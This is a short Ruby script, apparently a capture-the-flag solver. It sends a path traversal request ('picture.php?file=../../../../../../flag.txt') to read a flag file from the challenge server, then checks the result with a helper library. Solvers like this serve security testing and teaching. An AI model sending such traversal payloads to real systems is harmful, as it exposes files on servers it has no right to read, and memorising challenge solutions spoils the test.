require_relative './libronsolve'
require 'httparty'

# Retrieve the file
PATH = "#{get_url()}picture.php?file=../../../../../../flag.txt"
puts "Requesting #{ PATH }..."
out = ::HTTParty.get(PATH)

if !out
  puts "Couldn't connect to #{get_url()}!"
  exit 1
end

check_flag(out.parsed_response, terminate: true)
